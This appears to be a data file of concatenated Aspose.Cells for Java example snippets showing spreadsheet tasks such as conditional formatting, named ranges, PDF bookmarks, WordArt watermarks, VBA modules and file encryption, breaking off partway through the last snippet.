name,code
String dataDir = Utils.getDataDir(AddingTwoAndThreeColorScale.class);
// Create workbook
Workbook workbook = new Workbook();


// Access first worksheet
Worksheet worksheet = workbook.getWorksheets().get(0);


// Add some data in cells
worksheet.getCells().get(""A1"").putValue(""2-Color Scale"");
worksheet.getCells().get(""D1"").putValue(""3-Color Scale"");


for (int i = 2; i <= 15; i++) {
 worksheet.getCells().get(""A"" + i).putValue(i);
 worksheet.getCells().get(""D"" + i).putValue(i);
}


// Adding 2-Color Scale Conditional Formatting
CellArea ca = CellArea.createCellArea(""A2"", ""A15"");


int idx = worksheet.getConditionalFormattings().add();
FormatConditionCollection fcc = worksheet.getConditionalFormattings().get(idx);
fcc.addCondition(FormatConditionType.COLOR_SCALE);
fcc.addArea(ca);


FormatCondition fc = worksheet.getConditionalFormattings().get(idx).get(0);
fc.getColorScale().setIs3ColorScale(false);
fc.getColorScale().setMaxColor(Color.getLightBlue());
fc.getColorScale().setMinColor(Color.getLightGreen());


// Adding 3-Color Scale Conditional Formatting
ca = CellArea.createCellArea(""D2"", ""D15"");


idx = worksheet.getConditionalFormattings().add();
fcc = worksheet.getConditionalFormattings().get(idx);
fcc.addCondition(FormatConditionType.COLOR_SCALE);
fcc.addArea(ca);


fc = worksheet.getConditionalFormattings().get(idx).get(0);
fc.getColorScale().setIs3ColorScale(true);
fc.getColorScale().setMaxColor(Color.getLightBlue());
fc.getColorScale().setMidColor(Color.getYellow());
fc.getColorScale().setMinColor(Color.getLightGreen());


// Save the workbook
workbook.save(dataDir + ""output.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getDataDir(AddLibraryReference.class);
Workbook workbook = new Workbook();


VbaProject vbaProj = workbook.getVbaProject();


vbaProj.getReferences().addRegisteredReference(""stdole"",
 ""*\\G{00020430-0000-0000-C000-000000000046}#2.0#0#C:\\Windows\\system32\\stdole2.tlb#OLE Automation"");
vbaProj.getReferences().addRegisteredReference(""Office"",
 ""*\\G{2DF8D04C-5BFA-101B-BDE5-00AA0044DE52}#2.0#0#C:\\Program Files\\Common Files\\Microsoft Shared\\OFFICE14\\MSO.DLL#Microsoft Office 14.0 Object Library"");


workbook.save(dataDir + ""output.xlsm"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getDataDir(AddNamedRangeWithWorkbookScope.class);
// Instantiating a Workbook object
Workbook workbook = new Workbook();


// Get Worksheets collection
WorksheetCollection worksheets = workbook.getWorksheets();


// Accessing the first worksheet in the Excel file
Worksheet sheet = worksheets.get(0);


// Get worksheet Cells collection
Cells cells = sheet.getCells();


// Creating a workbook scope named range
Range namedRange = cells.createRange(""A1"", ""C10"");
namedRange.setName(""workbookScope"");


// Saving the modified Excel file in default format
workbook.save(dataDir + ""output.xls"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getDataDir(AddNamedRangeWithWorkbookScope.class);
// Instantiating a Workbook object
Workbook workbook = new Workbook();


// Get Worksheets collection
WorksheetCollection worksheets = workbook.getWorksheets();


// Accessing the first worksheet in the Excel file
Worksheet sheet = worksheets.get(0);


// Get worksheet Cells collection
Cells cells = sheet.getCells();


// Creating a workbook scope named range
Range namedRange = cells.createRange(""A1"", ""C10"");
namedRange.setName(""Sheet1!local"");


// Saving the modified Excel file in default format
workbook.save(dataDir + ""output.xls"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getDataDir(AddPDFBookmarks.class);
// Instantiate a new workbook.
Workbook workbook = new Workbook();


// Get the worksheets in the workbook.
WorksheetCollection worksheets = workbook.getWorksheets();


// Add a sheet to the workbook.
worksheets.add(""1"");


// Add 2nd sheet to the workbook.
worksheets.add(""2"");


// Add the third sheet.
worksheets.add(""3"");


// Get cells in different worksheets.
Cell cellInPage1 = worksheets.get(0).getCells().get(""A1"");
Cell cellInPage2 = worksheets.get(1).getCells().get(""A1"");
Cell cellInPage3 = worksheets.get(2).getCells().get(""A1"");


// Add a value to the A1 cell in the first sheet.
cellInPage1.setValue(""a"");


// Add a value to the A1 cell in the second sheet.
cellInPage2.setValue(""b"");


// Add a value to the A1 cell in the third sheet.
cellInPage3.setValue(""c"");


// Create the PdfBookmark entry object.
PdfBookmarkEntry pbeRoot = new PdfBookmarkEntry();


// Set its text.
pbeRoot.setText(""root"");


// Set its destination source page.
pbeRoot.setDestination(cellInPage1);


// Set the bookmark collapsed.
pbeRoot.setOpen(false);


// Add a new PdfBookmark entry object.
PdfBookmarkEntry subPbe1 = new PdfBookmarkEntry();


// Set its text.
subPbe1.setText(""1"");


// Set its destination source page.
subPbe1.setDestination(cellInPage2);


// Add another PdfBookmark entry object.
PdfBookmarkEntry subPbe2 = new PdfBookmarkEntry();


// Set its text.
subPbe2.setText(""2"");


// Set its destination source page.
subPbe2.setDestination(cellInPage3);


// Create an array list.
ArrayList subEntryList = new ArrayList();


// Add the entry objects to it.
subEntryList.add(subPbe1);
subEntryList.add(subPbe2);
pbeRoot.setSubEntry(subEntryList);


// Set the PDF bookmarks.
PdfSaveOptions options = new PdfSaveOptions();
options.setBookmark(pbeRoot);


// Save the PDF file.
workbook.save(dataDir, options);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getSharedDataDir(AddPicturetoExcelComment.class) + ""articles/"";
// Instantiate a Workbook
Workbook workbook = new Workbook();


// Get a reference of comments collection with the first sheet
CommentCollection comments = workbook.getWorksheets().get(0).getComments();


// Add a comment to cell A1
int commentIndex = comments.add(0, 0);
Comment comment = comments.get(commentIndex);
comment.setNote(""First note."");
comment.getFont().setName(""Times New Roman"");


// Load/Read an image into stream
String logo_url = dataDir + ""school.jpg"";


// Creating the instance of the FileInputStream object to open the logo/picture in the stream
FileInputStream inFile = new FileInputStream(logo_url);


// Setting the logo/picture
byte[] picData = new byte[inFile.available()];
inFile.read(picData);


// Set image data to the shape associated with the comment
comment.getCommentShape().getFill().setImageData(picData);


// Save the workbook
workbook.save(dataDir + ""APToExcelComment_out.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getDataDir(AddVBAModuleAndCode.class);
// Create new workbook
Workbook workbook = new Workbook();


// Access first worksheet
Worksheet worksheet = workbook.getWorksheets().get(0);


// Add VBA Module
int idx = workbook.getVbaProject().getModules().add(worksheet);


// Access the VBA Module, set its name and codes
VbaModule module = workbook.getVbaProject().getModules().get(idx);
module.setName(""TestModule"");


module.setCodes(""Sub ShowMessage()"" + ""\r\n"" + ""    MsgBox \""Welcome to Aspose!\"""" + ""\r\n"" + ""End Sub"");


// Save the workbook
workbook.save(dataDir + ""output.xlsm"", SaveFormat.XLSM);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getSharedDataDir(AddWordArtText.class) + ""articles/"";
// Create workbook object
Workbook wb = new Workbook();


// Access first worksheet
Worksheet ws = wb.getWorksheets().get(0);


// Add Word Art Text with Built-in Styles
ws.getShapes().addWordArt(PresetWordArtStyle.WORD_ART_STYLE_1, ""Aspose File Format APIs"", 00, 0, 0, 0, 100, 800);
ws.getShapes().addWordArt(PresetWordArtStyle.WORD_ART_STYLE_2, ""Aspose File Format APIs"", 10, 0, 0, 0, 100, 800);
ws.getShapes().addWordArt(PresetWordArtStyle.WORD_ART_STYLE_3, ""Aspose File Format APIs"", 20, 0, 0, 0, 100, 800);
ws.getShapes().addWordArt(PresetWordArtStyle.WORD_ART_STYLE_4, ""Aspose File Format APIs"", 30, 0, 0, 0, 100, 800);
ws.getShapes().addWordArt(PresetWordArtStyle.WORD_ART_STYLE_5, ""Aspose File Format APIs"", 40, 0, 0, 0, 100, 800);


// Save the workbook in xlsx format
wb.save(dataDir + ""AddWordArtText_out.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getSharedDataDir(AddWordArtWatermarkToChart.class) + ""articles/"";
// Instantiate a new workbook, Open the existing excel file.


Workbook workbook = new Workbook(dataDir + ""sample.xlsx"");


// Get the chart in the first worksheet.
Chart chart = workbook.getWorksheets().get(0).getCharts().get(0);


// Add a WordArt watermark (shape) to the chart's plot area.
Shape wordart = chart.getShapes().addTextEffectInChart(MsoPresetTextEffect.TEXT_EFFECT_1, ""CONFIDENTIAL"",
 ""Arial Black"", 66, false, false, 1200, 500, 2000, 3000);


// Get the shape's fill format.
FillFormat wordArtFormat = wordart.getFill();


// Set the transparency.
wordArtFormat.setTransparency(0.9);


// Get the line format.
LineFormat lineFormat = wordart.getLine();


// Set Line format to invisible.
lineFormat.setWeight(0.0);


// Save the excel file.
workbook.save(dataDir + ""AWArtWToC_out.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getSharedDataDir(AddWordArtWatermarkToWorksheet.class) + ""articles/"";
// Instantiate a new Workbook
Workbook workbook = new Workbook();


// Get the first default sheet
Worksheet sheet = workbook.getWorksheets().get(0);


// Add Watermark
Shape wordart = sheet.getShapes().addTextEffect(MsoPresetTextEffect.TEXT_EFFECT_1, ""CONFIDENTIAL"",
 ""Arial Black"", 50, false, true, 18, 8, 1, 1, 130, 800);


// Get the fill format of the word art
FillFormat wordArtFormat = wordart.getFill();


// Set the color
wordArtFormat.setOneColorGradient(Color.getRed(), 0.2, GradientStyleType.HORIZONTAL, 2);


// Set the transparency
wordArtFormat.setTransparency(0.9);


// Make the line invisible
LineFormat lineFormat = wordart.getLine();
lineFormat.setWeight(0.0);


// Save the file
workbook.save(dataDir + ""AWArtWToWorksheet_out.xls"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getSharedDataDir(AddXMLMapInsideWorkbook.class) + ""articles/"";
// Create workbook object
Workbook wb = new Workbook();


// Add xml map found inside the sample.xml inside the workbook
wb.getWorksheets().getXmlMaps().add(dataDir + ""sample.xml"");


// Save the workbook in xlsx format
wb.save(dataDir + ""AddXMLMapInsideWorkbook_out.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
String dataDir = Utils.getDataDir(ApplyingEncryption.class);


// Instantiate a Workbook object.
Workbook workbook = new Workbook(dataDir + ""Book1.xls"");


// Password protect the file.
workbook.getSettings().setPassword(""1234"");


// Specify Strong Encryption type (RC4,Microsoft Strong Cryptographic Provider).
workbook.setEncryptionOptions(EncryptionType.STRONG_CRYPTOGRAPHIC_PROVIDER, 128);


// Save the Excel file.
workbook.save(dataDir + ""encryptedBook1.xls"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getDataDir(ApplyingSubscript.class);
// Instantiating a Workbook object
Workbook workbook = new Workbook();


// Accessing the added worksheet in the Excel file
Worksheet worksheet = workbook.getWorksheets().get(0);


Cells cells = worksheet.getCells();


// Adding some value to the ""A1"" cell
Cell cell = cells.get(""A1"");


cell.setValue(""Hello"");


// Setting the font name to ""Times New Roman""
Style style = cell.getStyle();


Font font = style.getFont();
font.setSubscript(true);


cell.setStyle(style);


// Saving the modified Excel file in default format
workbook.save(dataDir + ""Subscript.xls"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getDataDir(ApplyingSuperscript.class);
// Instantiating a Workbook object
Workbook workbook = new Workbook();


// Accessing the added worksheet in the Excel file
Worksheet worksheet = workbook.getWorksheets().get(0);


Cells cells = worksheet.getCells();
